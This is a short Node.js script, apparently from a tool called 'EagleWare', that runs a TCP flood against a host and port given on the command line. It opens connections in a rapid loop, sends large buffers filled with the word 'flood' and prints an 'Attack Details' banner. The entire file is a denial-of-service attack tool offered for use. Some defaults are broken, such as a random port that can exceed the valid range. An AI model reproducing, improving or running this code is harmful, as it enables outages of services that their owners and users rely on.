const net = require('net');
const process = require('process');

const [,, ip, port, size, time] = process.argv;

const endtime = Date.now() + (time ? time * 1000 : 100000);
const packetSize = size ? parseInt(size) : Math.floor(Math.random() * (1500000 - 64)) + 64;
const targetPort = port ? parseInt(port) : Math.floor(Math.random() * 1500000) + 1;

const centerText = (text, width) => {
    const padding = Math.max(0, Math.floor((width - text.length) / 2));
    return ' '.repeat(padding) + text;
};

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(centerText("EagleWare Attack Details", width));
    console.log(centerText("╔════════════════════════════════════════╗", width));
    console.log(centerText(` Host: ${ip}`, width));
    console.log(centerText(` Port: ${targetPort}`, width));
    console.log(centerText(` Size: ${packetSize} bytes`, width));
    console.log(centerText(` Time: ${time} seconds`, width));
    console.log(centerText(` Method: TCP`, width));
    console.log(centerText(` This Method Is Under Development!`, width));
    console.log(centerText("╚════════════════════════════════════════╝", width));
    console.log(centerText("Reset your network if internet doesn't work", width));
};

printAttackDetails();

let packetCount = 0;

const sendPackets = () => {
    if (Date.now() > endtime) {
        return;
    }

    const client = new net.Socket();
    client.connect(targetPort, ip, () => {
        const message = Buffer.alloc(packetSize, 'flood');
        client.write(message);
        packetCount++;
        client.end();
        setImmediate(sendPackets);
    });

    client.on('error', (err) => {
        console.error('Error sending packet:', err);
        client.destroy(); 
    });
};

sendPackets();
